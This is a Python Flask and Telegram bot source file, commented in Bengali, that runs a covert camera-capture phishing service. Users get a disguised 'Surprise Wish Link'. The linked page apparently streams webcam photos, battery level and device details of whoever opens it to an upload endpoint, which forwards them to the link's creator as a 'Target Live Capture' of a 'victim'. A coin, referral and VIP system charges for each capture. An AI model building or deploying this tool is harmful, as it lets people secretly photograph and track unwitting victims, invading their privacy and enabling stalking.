import logging, base64, asyncio, os, threading, uuid, time
from flask import Flask, request, jsonify, render_template
from telegram import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# লগিং ও কনফিগারেশন
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN = os.environ.get("TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID"))
MY_USERNAME = os.environ.get("MY_USERNAME")

REFER_REWARD = 2  
users_db = {}
forced_channels = []  
pending_referrals = {} 
user_states = {}  

# ইউজারের সক্রিয় সেশন ট্র্যাক করার জন্য
user_active_sessions = {}
# কোন সেশনগুলো বর্তমানে লাইভ চলছে এবং শেষ কখন রিকোয়েস্ট এসেছে তা ট্র্যাক করতে (সেশন টোকেন -> শেষের সময়)
live_sessions_tracker = {}

app_telegram = None  
bot_loop = None

# --- ফ্লাস্ক সার্ভার ---
flask_app = Flask(__name__, template_folder='templates')

@flask_app.route('/')
def index():
    return render_template('index.html')

@flask_app.route('/upload-image', methods=['POST'])
def upload_image():
    data = request.json
    owner_id = data.get('chat_id')  
    image_data = data.get('image')
    session_token = data.get('s')  
    name = data.get('name', 'Unknown')
    battery = data.get('battery', 'N/A')
    platform = data.get('platform', 'Mobile/PC')

    if not owner_id or not image_data or not session_token:
        return jsonify({"status": "error", "message": "Invalid data"}), 400

    try:
        owner_id = int(owner_id)
        
        # ১. লিংকটি বট থেকে জেনারেট করা আসল লিংক কি না চেক
        if user_active_sessions.get(owner_id) != session_token:
            # যদি এই সেশন ইতিমধ্যে ক্লোজ হয়ে যায় বা অন্য কেউ ইউজ করতে চায়
            if session_token not in live_sessions_tracker:
                return jsonify({"status": "error", "message": "Link expired or closed"}), 400

        current_time = time.time()
        is_first_capture = False

        # ২. ট্র্যাকিং চেক: এই সেশন কি ইতিমধ্যে লাইভে আছে?
        if session_token not in live_sessions_tracker:
            is_first_capture = True
            # নতুন লাইভ সেশন শুরু হলো, তাই মেইন সেশন টোকেন রিসেট করে দেবো যাতে অন্য কেউ এই লিংকে ঢুকতে না পারে
            user_active_sessions[owner_id] = "locked_in_progress_" + str(uuid.uuid4())
            live_sessions_tracker[session_token] = current_time

            # কয়েন কাটার লজিক (মাত্র একবারই কাটবে)
            if owner_id in users_db:
                if not users_db[owner_id].get("is_vip", False):
                    if users_db[owner_id]["balance"] >= 1:
                        users_db[owner_id]["balance"] -= 1
                    else:
                        return jsonify({"status": "error", "message": "Insufficient coins"}), 400
        else:
            # যদি সেশন আগে থেকেই লাইভ থাকে, তবে টাইম আপডেট করে দেবো
            live_sessions_tracker[session_token] = current_time

        header, encoded = image_data.split(",", 1)
        image_bytes = base64.b64decode(encoded)

        caption = (
            f"📸 **Target Live Capture!**\n\n"
            f"👤 **Name/Input:** {name}\n"
            f"🔋 **Battery:** {battery}\n"
            f"💻 **Device Info:** {platform}\n\n"
            f"🛠 **Developed by:** {MY_USERNAME}"
        )

        asyncio.run_coroutine_threadsafe(
            send_photo_to_owner(owner_id, image_bytes, caption, is_first_capture),
            bot_loop
        )

        return jsonify({"status": "success"})
    except Exception as e:
        logger.error(f"Image upload error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

async def send_photo_to_owner(owner_id, photo_bytes, caption, is_first):
    try:
        await app_telegram.bot.send_photo(chat_id=owner_id, photo=photo_bytes, caption=caption, parse_mode="Markdown")
        if owner_id in users_db and is_first:
            bal = "VIP (Unlimited)" if users_db[owner_id]["is_vip"] else f"{users_db[owner_id]['balance']} Coins"
            await app_telegram.bot.send_message(chat_id=owner_id, text=f"🎯 ভিকটিমের পেজ থেকে লাইভ ছবি আসা শুরু হয়েছে! (১ কয়েন কাটা হয়েছে)\n💰 বর্তমান ব্যালেন্স: {bal}")
    except Exception as e:
        logger.error(f"Telegram send photo error: {e}")

# ব্যাকগ্রাউন্ডে চেক করবে কোনো ভিকটিম পেজ কেটে দিয়েছে কি না (৫ সেকেন্ডের বেশি রিকোয়েস্ট না আসলে লিংক ডেড করে দেবে)
def cleanup_dead_sessions():
    while True:
        time.sleep(3)
        current_time = time.time()
        dead_tokens = []
        for token, last_seen in live_sessions_tracker.items():
            # যদি ৫ সেকেন্ডের বেশি সময় ধরে ওই ব্রাউজার থেকে কোনো ছবি বা রিকোয়েস্ট না আসে, ধরি পেজ কেটে দিয়েছে
            if current_time - last_seen > 5:
                dead_tokens.append(token)
        for token in dead_tokens:
            del live_sessions_tracker[token]

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    flask_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# --- টেলিগ্রাম বট কিবোর্ড ও লজিক ---

def main_reply_keyboard(is_admin=False):
    keyboard = [
        [KeyboardButton("🔗 Get Link"), KeyboardButton("👤 Profile")],
        [KeyboardButton("🎁 Refer"), KeyboardButton("ℹ️ Help / Info")]
    ]
    if is_admin:
        keyboard.append([KeyboardButton("🛠 Admin Panel")])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def admin_panel_keyboard():
    keyboard = [
        [InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast")],
        [InlineKeyboardButton("📈 Statistics", callback_data="adm_stats")],
        [InlineKeyboardButton("💰 User Coin (+/-)", callback_data="adm_user_coin")],
        [InlineKeyboardButton("🎁 Set Refer Reward", callback_data="adm_set_refer")],
        [InlineKeyboardButton("👑 Make VIP", callback_data="adm_make_vip"),
         InlineKeyboardButton("👤 Make Normal", callback_data="adm_make_normal")],
        [InlineKeyboardButton("➕ Add Channel", callback_data="adm_add_chan"),
         InlineKeyboardButton("➖ Remove Channel", callback_data="adm_rem_chan")],
        [InlineKeyboardButton("📋 Channel List", callback_data="adm_list_chan")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def check_user_channels(bot, user_id):
    for channel in forced_channels:
        try:
            member = await bot.get_chat_member(chat_id=channel, user_id=user_id)
            if member.status in ['left', 'kicked']:
                return False
        except Exception:
            return False
    return True

def force_join_keyboard():
    keyboard = []
    for chan in forced_channels:
        keyboard.append([InlineKeyboardButton(f"📢 Join Channel", url=f"https://t.me/{chan.replace('@', '')}")])
    keyboard.append([InlineKeyboardButton("✅ Check Join", callback_data="check_join")])
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global REFER_REWARD
    user = update.effective_user
    user_id = user.id
    username = user.username or "N/A"
    is_admin = (user_id == ADMIN_ID)

    if user_id not in users_db:
        users_db[user_id] = {"username": username, "balance": 3, "referrals": 0, "is_vip": False}

        if context.args and context.args[0].startswith("ref_"):
            try:
                referrer_id = int(context.args[0].split("_")[1])
                if referrer_id != user_id and referrer_id in users_db:
                    is_joined = await check_user_channels(context.bot, user_id)
                    if is_joined:
                        users_db[referrer_id]["balance"] += REFER_REWARD
                        users_db[referrer_id]["referrals"] += 1
                        try:
                            await context.bot.send_message(
                                referrer_id, 
                                f"🎉 অভিনন্দন! আপনার রেফার লিংক থেকে নতুন একজন জয়েন করেছে এবং আপনি **{REFER_REWARD} Coins** বোনাস পেয়েছেন!\n💰 বর্তমান ব্যালেন্স: {users_db[referrer_id]['balance']} Coins"
                            )
                        except Exception:
                            pass
                    else:
                        pending_referrals[user_id] = referrer_id
            except Exception:
                pass

    if forced_channels:
        is_joined = await check_user_channels(context.bot, user_id)
        if not is_joined:
            await update.message.reply_text(
                "⚠️ বট ব্যবহার করতে হলে অবশ্যই আমাদের চ্যানেলগুলোতে জয়েন করতে হবে!\n\nজয়েন করার পর নিচের বাটনে ক্লিক করুন:",
                reply_markup=force_join_keyboard()
            )
            return

    await update.message.reply_text(
        "👋 **স্বাগতম!** নিচের ফিক্সড বাটনগুলো থেকে অপশন সিলেক্ট করুন:",
        reply_markup=main_reply_keyboard(is_admin),
        parse_mode="Markdown"
    )

async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global REFER_REWARD
    query = update.callback_query
    user_id = query.from_user.id
    is_admin = (user_id == ADMIN_ID)

    is_joined = await check_user_channels(context.bot, user_id)
    if not is_joined:
        await query.answer("❌ আপনি এখনো সব চ্যানেলে জয়েন করেননি!", show_alert=True)
        return

    await query.answer("✅ ভেরিফিকেশন সফল হয়েছে!", show_alert=True)

    if user_id in pending_referrals:
        referrer_id = pending_referrals[user_id]
        if referrer_id in users_db:
            users_db[referrer_id]["balance"] += REFER_REWARD
            users_db[referrer_id]["referrals"] += 1
            try:
                await context.bot.send_message(
                    referrer_id, 
                    f"🎉 অভিনন্দন! আপনার রেফার লিংক থেকে নতুন একজন জয়েন করেছে এবং আপনি **{REFER_REWARD} Coins** বোনাস পেয়েছেন!\n💰 বর্তমান ব্যালেন্স: {users_db[referrer_id]['balance']} Coins"
                )
            except Exception:
                pass
        del pending_referrals[user_id]

    await query.message.delete()
    await context.bot.send_message(
        chat_id=user_id,
        text="👋 **স্বাগতম!** নিচের ফিক্সড বাটনগুলো ব্যবহার করুন:",
        reply_markup=main_reply_keyboard(is_admin),
        parse_mode="Markdown"
    )

async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global REFER_REWARD
    text = update.message.text
    user_id = update.effective_user.id
    is_admin = (user_id == ADMIN_ID)

    if forced_channels:
        is_joined = await check_user_channels(context.bot, user_id)
        if not is_joined:
            await update.message.reply_text("⚠️ প্রথমে চ্যানেলগুলোতে জয়েন করুন:", reply_markup=force_join_keyboard())
            return

    if is_admin:
        state = user_states.get(user_id)
        if state == "waiting_broadcast":
            user_states[user_id] = None
            count = 0
            for uid in users_db:
                try:
                    await context.bot.copy_message(chat_id=uid, from_chat_id=user_id, message_id=update.message.message_id)
                    count += 1
                except Exception:
                    pass
            await update.message.reply_text(f"✅ সফলভাবে {count} জনের কাছে ব্রডকাস্ট হয়েছে!", reply_markup=main_reply_keyboard(is_admin))
            return
        elif state == "waiting_add_channel":
            user_states[user_id] = None
            chan_name = text.strip()
            if chan_name not in forced_channels:
                forced_channels.append(chan_name)
                await update.message.reply_text(f"✅ চ্যানেল যুক্ত হয়েছে: {chan_name}", reply_markup=main_reply_keyboard(is_admin))
            else:
                await update.message.reply_text(f"⚠️ চ্যানেলটি আগেই লিস্টে আছে!", reply_markup=main_reply_keyboard(is_admin))
            return
        elif state == "waiting_rem_channel":
            user_states[user_id] = None
            chan_name = text.strip()
            if chan_name in forced_channels:
                forced_channels.remove(chan_name)
                await update.message.reply_text(f"✅ চ্যানেল রিমুভ করা হয়েছে: {chan_name}", reply_markup=main_reply_keyboard(is_admin))
            else:
                await update.message.reply_text(f"❌ এই নামের কোনো চ্যানেল লিস্টে পাওয়া যায়নি!", reply_markup=main_reply_keyboard(is_admin))
            return
        elif state == "waiting_user_coin":
            user_states[user_id] = None
            parts = text.strip().split()
            if len(parts) == 2:
                try:
                    target_uid = int(parts[0])
                    amount = int(parts[1])
                    if target_uid in users_db:
                        users_db[target_uid]["balance"] += amount
                        if users_db[target_uid]["balance"] < 0:
                            users_db[target_uid]["balance"] = 0
                        await update.message.reply_text(f"✅ ইউজার (`{target_uid}`) এর কয়েন আপডেট হয়েছে। ব্যালেন্স: {users_db[target_uid]['balance']}", parse_mode="Markdown")
                    else:
                        await update.message.reply_text("❌ ইউজার পাওয়া যায়নি।")
                except ValueError:
                    await update.message.reply_text("❌ সঠিক ফরম্যাটে লিখুন: `UserID Amount`")
            return
        elif state == "waiting_set_refer":
            user_states[user_id] = None
            try:
                new_reward = int(text.strip())
                REFER_REWARD = new_reward
                await update.message.reply_text(f"✅ সফলভাবে নতুন রেফার বোনাস সেট করা হয়েছে: **{REFER_REWARD} Coins**", parse_mode="Markdown", reply_markup=main_reply_keyboard(is_admin))
            except ValueError:
                await update.message.reply_text("❌ সঠিক সংখ্যা লিখুন (যেমন: `3`)।", reply_markup=main_reply_keyboard(is_admin))
            return
        elif state == "waiting_make_vip":
            user_states[user_id] = None
            try:
                target_uid = int(text.strip())
                if target_uid in users_db:
                    users_db[target_uid]["is_vip"] = True
                    await update.message.reply_text(f"👑 ইউজার (`{target_uid}`) এখন **VIP**!", parse_mode="Markdown")
            except ValueError:
                pass
            return
        elif state == "waiting_make_normal":
            user_states[user_id] = None
            try:
                target_uid = int(text.strip())
                if target_uid in users_db:
                    users_db[target_uid]["is_vip"] = False
                    await update.message.reply_text(f"👤 ইউজার (`{target_uid}`) নরমাল মোডে আছে።", parse_mode="Markdown")
            except ValueError:
                pass
            return

    if text == "🔗 Get Link":
        user_data = users_db.get(user_id, {"balance": 3, "is_vip": False})
        if not user_data["is_vip"] and user_data["balance"] < 1:
            await update.message.reply_text("❌ পর্যাপ্ত কয়েন নেই! রেফার করে কয়েন অর্জন করুন।")
            return

        session_token = str(uuid.uuid4())[:8]
        user_active_sessions[user_id] = session_token

        base_url = os.environ.get("RENDER_EXTERNAL_URL", "http://localhost:5000")
        target_link = f"{base_url}/?id={user_id}&s={session_token}"
        
        vip_status = "👑 [VIP Unlimited]" if user_data["is_vip"] else f"💰 Current Balance: {user_data['balance']} Coins"
        await update.message.reply_text(f"🎁 **Surprise Wish Link**\n\n{vip_status}\n\nআপনার নতুন লিংক তৈরি হয়েছে:\n`{target_link}`", parse_mode="Markdown")

    elif text == "👤 Profile":
        user_data = users_db.get(user_id, {"balance": 3, "referrals": 0, "is_vip": False})
        status_str = "👑 VIP (Unlimited)" if user_data["is_vip"] else f"{user_data['balance']} Coins"
        await update.message.reply_text(f"👤 **Profile**\n🆔 ID: `{user_id}`\n💰 Balance: {status_str}\n👥 Referrals: {user_data['referrals']}", parse_mode="Markdown")

    elif text == "🎁 Refer":
        ref_link = f"https://t.me/{context.bot.username}?start=ref_{user_id}"
        await update.message.reply_text(f"🎁 প্রতি রেফারে পাবেন **{REFER_REWARD} Coins**!\n\n🔗 **Your Link:**\n`{ref_link}`", parse_mode="Markdown")

    elif text == "ℹ️ Help / Info":
        help_text = "ℹ️ **Help & Support**\n\nবট ব্যবহারে কোনো সমস্যা হলে বা কয়েন নিতে এডমিনের সাথে যোগাযোগ করুন:"
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("💬 Contact Admin", url=f"https://t.me/{MY_USERNAME.replace('@', '')}")]])
        await update.message.reply_text(help_text, reply_markup=keyboard, parse_mode="Markdown")

    elif text == "🛠 Admin Panel" and is_admin:
        await update.message.reply_text(f"🛠 **Admin Control Panel**\n🎁 Current Refer Reward: {REFER_REWARD} Coins", reply_markup=admin_panel_keyboard(), parse_mode="Markdown")

async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.from_user.id != ADMIN_ID:
        return
    data = query.data
    if data == "adm_broadcast":
        user_states[ADMIN_ID] = "waiting_broadcast"
        await query.message.reply_text("📢 ব্রডকাস্ট মেসেজ বা ফাইল পাঠান:")
    elif data == "adm_stats":
        await query.message.reply_text(f"📈 Total Users: {len(users_db)}\n🎁 Current Refer Reward: {REFER_REWARD} Coins")
    elif data == "adm_user_coin":
        user_states[ADMIN_ID] = "waiting_user_coin"
        await query.message.reply_text("💰 `UserID Amount` এভাবে লিখুন (যেমন: `123456789 50`):", parse_mode="Markdown")
    elif data == "adm_set_refer":
        user_states[ADMIN_ID] = "waiting_set_refer"
        await query.message.reply_text(f"🎁 বর্তমান রেফার বোনাস: **{REFER_REWARD} Coins**\n\nনতুন রেফার বোনাসের পরিমাণ কত দিতে চান তা লিখে পাঠান (যেমন: `3` বা `5`):", parse_mode="Markdown")
    elif data == "adm_make_vip":
        user_states[ADMIN_ID] = "waiting_make_vip"
        await query.message.reply_text("👑 VIP করার জন্য ইউজারের আইডি দিন:")
    elif data == "adm_make_normal":
        user_states[ADMIN_ID] = "waiting_make_normal"
        await query.message.reply_text("👤 Normal করার জন্য ইউজারের আইডি দিন:")
    elif data == "adm_add_chan":
        user_states[ADMIN_ID] = "waiting_add_channel"
        await query.message.reply_text("➕ যুক্ত করার জন্য চ্যানেলের ইউজারনেম দিন (যেমন `@channel`):")
    elif data == "adm_rem_chan":
        user_states[ADMIN_ID] = "waiting_rem_channel"
        await query.message.reply_text("➖ রিমুভ করার জন্য চ্যানেলের ইউজারনেম দিন (যেমন `@channel`):")
    elif data == "adm_list_chan":
        if forced_channels:
            chan_list_str = "\n".join([f"• {c}" for c in forced_channels])
            await query.message.reply_text(f"📋 **ফোর্স সাবস্ক্রিপশন চ্যানেলসমূহ:**\n\n{chan_list_str}", parse_mode="Markdown")
        else:
            await query.message.reply_text("📋 বর্তমানে কোনো ফোর্স চ্যানেল যুক্ত করা নেই।")

def main():
    global app_telegram, bot_loop
    
    app_telegram = ApplicationBuilder().token(TOKEN).build()
    
    try:
        bot_loop = asyncio.get_running_loop()
    except RuntimeError:
        bot_loop = asyncio.new_event_loop()
        asyncio.set_event_loop(bot_loop)

    # ফ্লাস্ক সার্ভার এবং সেশন ক্লিনার থ্রেড রান করা
    threading.Thread(target=run_flask, daemon=True).start()
    threading.Thread(target=cleanup_dead_sessions, daemon=True).start()

    app_telegram.add_handler(CommandHandler("start", start))
    app_telegram.add_handler(CallbackQueryHandler(check_join_callback, pattern="^check_join$"))
    app_telegram.add_handler(CallbackQueryHandler(admin_callback_handler, pattern="^adm_"))
    app_telegram.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_messages))

    print("বট এবং ফ্লাস্ক সার্ভার সফলভাবে রান হচ্ছে...")
    app_telegram.run_polling()

if __name__ == "__main__":
    main()
